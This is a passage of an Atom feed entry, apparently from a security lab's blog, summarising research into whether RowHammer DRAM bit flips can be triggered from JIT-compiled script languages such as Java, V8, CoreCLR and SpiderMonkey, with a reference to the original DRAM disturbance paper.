<li>Paper: Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors  <a href="http://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf" target="_blank" rel="external">http://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf</a></li>
<li>Source code</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>RowHammer is a problem with some DDR3 in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. However it need to run the customized asm code on target machine to trigger RowHammer, so RowHammer is not easy to be used to attack. We have an idea that try to use script language to trigger RowHammer. If it works, RowHammer will be more dangerous. In order to verify our idea, we analyzed the Java Hotspot, Chrome V8, .NET CoreCLR and Firefox SpiderMonfey.<br>]]>
    
    </summary>
    
      <category term="JIT" scheme="http://xlab.tencent.com/en/tags/JIT/"/>
    
      <category term="Javascript" scheme="http://xlab.tencent.com/en/tags/Javascript/"/>
    
      <category term="RowHammer" scheme="http://xlab.tencent.com/en/tags/RowHammer/"/>
    
  </entry>
  
</feed>
